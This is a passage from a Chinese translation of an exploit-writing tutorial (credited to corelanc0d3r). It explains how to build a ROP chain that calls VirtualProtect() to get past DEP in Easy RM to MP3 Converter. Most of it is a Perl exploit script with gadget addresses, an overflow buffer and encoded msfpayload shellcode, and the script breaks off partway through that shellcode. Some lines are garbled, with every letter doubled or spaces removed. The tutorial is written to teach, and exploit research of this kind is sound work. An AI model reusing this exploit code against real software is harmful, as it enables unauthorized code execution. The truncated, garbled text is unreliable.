按F9：
这意味着VirtualProtect()技术是成功的。
是停止玩的时候了&使它通用（=运行时创建动态值）。
EEEEvvvveeeerrrryyyybbbbooooddddyyyyssssttttaaaayyyy ccccoooooooollll,,,,tttthhhhiiiissss iiiissss aaaa rrrrooooppppppppeeeerrrryyyy
如果你希望用一些通用的指令来打造一个ROP链，那么我让你失望了。没有这样的东西。跟
着的是一些创造力，尝试&错误，一些asm事实的结果，和!pvefindaddr rop的输出。
唯一可能的接近“或多或少通用”的rop结构（这个是对我来说很好的）是这样的：
正如你看到的，我们在链的开头基本上限制了指令（rop小配件）的数目。我们只是保存栈
指针然后跳转（到VirtualProtect函数/参数），这会使后面覆盖参数占位符更容易点。（不要
担心--你会在一会儿之后明白我的意思）
函数指针/参数占位符很明显没有rop小配件，但是只是放在栈上的静态数据，作为缓冲区
的一部分。你唯一要做的事是用动态创建的值改变/覆盖占位符，用占位符后面的一个rop
链。
首先，我们要改变在我们的测试脚本中用来覆盖EIP的地址。不是直接调用VirtualProtect()，
我们现在不得不返回到栈上。因此用一个指向RETN的指针覆盖掉EIP。我们将用早些时候
找到的：0x100102DC
接下来，我们需要考虑在栈上精巧布置我们的值并将它们放在正确的地方的可能选择。
●shellcode的指针：一种最简单的方法是把ESP的地址放在一个寄存器中，然后增长它直
到它指向shellcode。可能有其他的方法，我们要在rop.txt的输出中看下我们的处理是什
么。
●Size变量：你可以设置一个寄存器一个开始值然后增长直到它包含0x40。或者你可以找
在寄存器上的ADD或SUB指令，当它执行时产生0x40。当然，你不得不首先将开始值（从
栈上弹出的）放入那个寄存器中。
●将动态产生的数据放回到栈上也可以通过很多种方法实现。你可以将值按照正确的顺序放
到寄存器中，然后用pushad将它们入栈。或者你可以用“MOV DWORD PTR DS：[寄存器A+
偏移量]，寄存器B”指令写入栈上的特定位置。当然寄存器B首先必须包含期望的值。
因此很明白你要看下rop.txt，你的工具箱，然后看下什么方法会成功。
你明显需要找到不会搞糟指令流或者改变其他寄存器/值的指令...如果它们可以的话，
你可以利用它。打造一个rop链的过程跟解决酷比魔方很像。当你执行一条指令，它可能会
对其他的寄存器/栈位置/...产生影响。目标是利用它们（或者当它们会破坏链时完全避免）
总是从创建你的rop.txt文件开始。如果你坚持用程序dll的指针，那么你可以创建很多
rop文件，每个特定的模块一个。但是只要你用OSdll自身的地址硬编码一个WindowsOSAPI
的函数指针，那么避免OS dll就没意义了。
或者，核查一下程序dll中的一个是否包含一样的函数调用是很值得的。这会是exploit
可移植和通用。（看后面的ASLR）
在这个例子中，我将用VirtualProtect()。可用的专用模块也是可执行程序自身（不受ASLR
的影响）和msrmfilter03.dll（不受ASLR影响并且也不会重定基址)。因此，用IDA Free
加载两个文件看下这些模块中的一个是否包含一个VirtualProtect()的调用。如果是的话，
我们也可以试着用程序自身的指针。
结果：没有找到任何调用，因此我们要用kernel32.dll里的地址
很好，我们现在真正开始
阶段1：保存栈指针然后跳过参数
我们的VirtualProtect()函数中的2个参数需要指向我们的shellcode。（返回值和
lpAddress）。由于shellcode放在栈上，最简单的方法是将当前栈指针存入一个寄存器。这
有3个优点：
●你可以简单地加/减寄存器上的值使它指向你的shellcode。ADD，SUB，INC，DEC指令很
普遍。
●最初的值指向跟VirtualProtect()在的栈地址很近。当我们需要跳回去并调用
VirtualProtect()时，我们要在rop链末尾利用这个。
●这个值也很靠近参数占位符的栈位置。用一个“mov dword ptr ds:[寄存器+偏移量]，寄
存器”指令来覆盖参数占位符很简单。
保存栈指针可以用很多方法：MOV REG，ESP/PUSH ESP+ROP REG，等等
你会注意到MOVREG，ESP不是一个好选择，因为很可能在同一个小配件中REG会又被弹出，
因此又覆盖了REG的栈指针。
在rop.txt中快速搜索后，我发现这个；
栈指针入栈，然后又弹入EDI中。这很好，但是，正如你将要学到的，在那个寄存器上做
ADD/SUB/...操作指令时，EDI不是一个流行的寄存器。因此将指针存入EAX中也是一个好
主意。此外，我们可能需要在两个寄存器中存这个指针。因为我们需要改变一个使它指向
shellcode，我们可能需要用另一个指向函数占位符在的栈位置。
因此，再次快速搜索rop.txt，我们得到这个：
这个也会将同样的栈指针存入EAX中，注意POPEBP指令。我们需要加上一些填料来弥补
这个指令。
好的，这是我们需要的一切。我真的很喜欢避免在函数指针/参数之前写太多小配件，因为
这会使覆盖参数占位符更难。因此剩下的是跳到函数块。
最简单的方法是加上一些字节到ESP，然后返回...：
到目前为止，我们的exploit脚本是这样的：
创建m3u文件，将Immunity附加到程序中，在0x100102DC处设断，打开文件直到碰到断
点。
当碰到断点时，看栈上。你应该能看到你的minirop链，紧跟着VirtualProtect的指针和它的
参数（占位符），然后在修改ESP后我们要结束的位置。
单步执行指令然后看EAX，EDI和ESP。你应该看到ESP被入栈，放进EDI中。然后EDI
被入栈然后弹出到EAX中。最后ESP加上0x20字节并且RET将会把4A4A4A4A放入EIP
（JJJJ=my$rop2）
明白了吗？让我们继续。
阶段2222：精巧制作第一个参数（返回值）
我们现在继续产生第一个参数然后覆盖在栈上第一个参数的占位符。
第一个参数需要指向shellcode。这个参数会用作VirtualProtect()函数的返回值，当函数已经
将页面标记为可执行时，它会自动跳到那里。
我们的shellcode在哪里？好的，在栈窗口中往下滚。在nop之后，我们将看到shellcode。
计划是用EAX或者EDI（两个都包含栈上的一个值），然后增加，留有足够的空间给未来的
rop小配件，因此它会指向nop/shellcode。
（你可以用nop的大小来确认改变了的值指向nop/shellcode，因此会很通用）
改变值是和在寄存器上加一些字节一样简单。假设我们要用EAX，我们可以找会做ADD
EAX，+RET的rop小配件。
一个可能的小配件是这样的：
它会在EAX上加上0x100。一次增加就已经足够了（0x100=256字节）。如果还不够的话，
我们可以在后面再次插入另一个add。
接下来，我们需要将这个值写入栈中，覆盖掉占位符（当前包含“WWWW”或者57575757）。
我们怎么做到这个？
最简单的方法是找一个指向MOVDWORDPTRDS：[寄存器]，EAX的指针。如果我们能
使[寄存器]指向占位符的地址，那么我们用EAX的内容（=指向shellcode的指针）覆盖掉
那个位置来结束。
一个可行的指针是这样的：
为了能使它成功，我们不得不放一个指针到占位符中-0x10到ESI。在这个值被写入时，我
们在EAX中有指向占位符的指针（MOVEAX，ESI），很棒...我们会在后面又用到它。接下
来，我们需要插入一些填料来弥补POPESI指令。
提示：使自己拥有一份UnxUtilshttp://sourceforge.net/projects/unxutils/的拷贝（GNU最
重要的实用工具的端口，对win32）。这方法能用cat&grep来找好的小配件：
catrop.txt|grep"MOVDWORDPTRDS:\[ESI+10],EAX#MOVEAX,ESI"
(不要忘了：和[之间的反斜杠）
但是在我们能用这个指令之前，我们不得不将正确的值放入ESI中。我们在EDI和EAX中
有指向栈的指针。EAX将会被用/改变（指向shellcode，记得），因此我们需要试着将EDI
的值放到ESI中，然后改变它的值使它指向参数1的占位符-0x10：
将这三个东西放在一起，我们的第一个真正的rop链是这样的：
将EDI放入ESI（然后增加它，如果必要的话，它会指向占位符1），改变EAX中的值因此
它会指向shellcode，然后覆盖掉占位符。
（注意：对第一个覆盖操作，ESI会自动指向正确的位置，因此我们需要增加或减少值。
ESI+10将会指向第一个参数占位符的位置）
在小配件之间，我们需要弥补额外的POP和RET4。
在将东西放在一起之后，exploit脚本是这样的：
#------------------------------------------------------------
#ROPbasedexploitforEasyRMtoMP3Converter
#writtenbycorelanc0d3r-http://www.corelan.be:8800
#------------------------------------------------------------
my$file="rop.m3u";
my$buffersize=26094;
my$junk="Z"x$buffersize;
my$eip=pack('V',0x100102DC);#returntostack
my$junk2="AAAA";#compensate
#------PutstackpointerinEDI&EAX------------------------#
my$rop=pack('V',0x5AD79277); #PUSHESP,POPEDI
$rop=$rop.pack('V',0x77C1E842);#PUSHEDI,POPEAX
$rop=$rop."AAAA";#compensateforPOPEBP
#stackpointerisnowinEAX&EDI,nowjumpoverparameters
$rop=$rop.pack('V',0x1001653D); #ADDESP,20
#-------ParametersforVirtualProtect()----------------------#
my$params=pack('V',0x7C801AD4); #VirtualProtect()
$params=$params."WWWW"; #returnaddress(param1)
$params=$params."XXXX"; #lpAddress (param2)
$params=$params."YYYY"; #Size (param3)
$params=$params."ZZZZ"; #flNewProtect (param4)
$params=$params.pack('V',0x10035005); #writeableaddress
$params=$params.("H"x8); #padding
#ADDESP,20+RETwilllandhere
#changeESIsoitpointstocorrectlocation
#towritefirstparameter(returnaddress)
my$rop2=pack('V',0x763C982F); #XCHGESI,EDI#DECECX#RETN4
#-----Makeeaxpointatshellcode--------------------------
$rop2=$rop2.pack('V',0x1002DC4C); #ADDEAX,100#POPEBP
$rop2=$rop2."AAAA";#padding-compensateforRETN4before
$rop2=$rop2."AAAA";#padding
#----------------------------------------------------------
#returnaddressisinEAX-writeparameter1
$rop2=$rop2.pack('V',0x77E84115);
$rop2=$rop2."AAAA";#padding
#
my$nops="\x90"x240;
#
#./msfpayloadwindows/messagebox
# TITLE=CORELANTEXT="roptestbycorelanc0d3r"R
#|./msfencode-ex86/alpha_mixed-tperl
my$shellcode=
"\x89\xe0\xda\xcf\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a".
"\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59".
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41".
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42".
"\x75\x4a\x49\x48\x59\x48\x6b\x4f\x6b\x48\x59\x43\x44\x51".
"\x34\x4c\x34\x50\x31\x48\x52\x4f\x42\x42\x5a\x46\x51\x49".
"\x59\x45\x34\x4e\x6b\x51\x61\x44\x70\x4e\x6b\x43\x46\x46".
"\x6c\x4c\x4b\x42\x56\x45\x4c\x4c\x4b\x42\x66\x43\x38\x4c".
"\x4b\x51\x6e\x45\x70\x4e\x6b\x50\x36\x44\x78\x42\x6f\x45".
"\x48\x44\x35\x4c\x33\x50\x59\x43\x31\x4a\x71\x4b\x4f\x48".
"\x61\x43\x50\x4c\x4b\x50\x6c\x51\x34\x46\x44\x4e\x6b\x47".
"\x35\x45\x6c\x4c\x4b\x42\x74\x43\x35\x42\x58\x46\x61\x48".
"\x6a\x4e\x6b\x51\x5a\x45\x48\x4e\x6b\x42\x7a\x47\x50\x47".
"\x71\x48\x6b\x4a\x43\x45\x67\x42\x69\x4e\x6b\x47\x44\x4e".
"\x6b\x46\x61\x48\x6e\x46\x51\x49\x6f\x45\x61\x49\x50\x49".
"\x6c\x4e\x4c\x4d\x54\x49\x50\x50\x74\x45\x5a\x4b\x71\x48".
"\x4f\x44\x4d\x47\x71\x4b\x77\x48\x69\x48\x71\x49\x6f\x49".
"\x6f\x4b\x4f\x45\x6b\x43\x4c\x47\x54\x44\x68\x51\x65\x49".
"\x4e\x4e\x6b\x50\x5a\x45\x74\x46\x61\x48\x6b\x50\x66\x4e".
"\x6b\x46\x6c\x50\x4b\x4c\x4b\x51\x4a\x45\x4c\x45\x51\x4a".
"\x4b\x4e\x6b\x43\x34\x4c\x4b\x43\x31\x4a\x48\x4d\x59\x42".
"\x64\x51\x34\x47\x6c\x45\x31\x4f\x33\x4f\x42\x47\x78\x44".
"\x69\x49\x44\x4f\x79\x4a\x45\x4e\x69\x4a\x62\x43\x58\x4e".
"\x6e\x42\x6e\x44\x4e\x48\x6c\x43\x62\x4a\x48\x4d\x4c\x4b".
"\x4f\x4b\x4f\x49\x6f\x4d\x59\x42\x65\x43\x34\x4f\x4b\x51".
"\x6e\x48\x58\x48\x62\x43\x43\x4e\x67\x47\x6c\x45\x74\x43".
"\x62\x49\x78\x4e\x6b\x4b\x4f\x4b\x4f\x49\x6f\x4f\x79\x50".
"\x45\x45\x58\x42\x48\x50\x6c\x42\x4c\x51\x30\x4b\x4f\x51".
"\x78\x50\x33\x44\x72\x44\x6e\x51\x74\x50\x68\x42\x55\x50".
"\x73\x42\x45\x42\x52\x4f\x78\x43\x6c\x47\x54\x44\x4a\x4c".
"\x49\x4d\x36\x50\x56\x4b\x4f\x43\x65\x47\x74\x4c\x49\x48".
"\x42\x42\x70\x4f\x4b\x49\x38\x4c\x62\x50\x4d\x4d\x6c\x4e".
"\x67\x45\x4c\x44\x64\x51\x42\x49\x78\x51\x4e\x49\x6f\x4b".
"\x4f\x49\x6f\x42\x48\x42\x6c\x43\x71\x42\x6e\x50\x58\x50".
"\x68\x47\x33\x42\x6f\x50\x52\x43\x75\x45\x61\x4b\x6b\x4e".
"\x68\x51\x4c\x47\x54\x47\x77\x4d\x59\x4b\x53\x50\x68\x51".
"\x48\x47\x50\x51\x30\x51\x30\x42\x48\x50\x30\x51\x74\x50".
"\x33\x50\x72\x45\x38\x42\x4c\x45\x31\x50\x6e\x51\x73\x43".
"\x58\x50\x63\x50\x6f\x43\x42\x50\x65\x42\x48\x47\x50\x43".
"\x52\x43\x49\x51\x30\x51\x78\x43\x44\x42\x45\x51\x63\x50".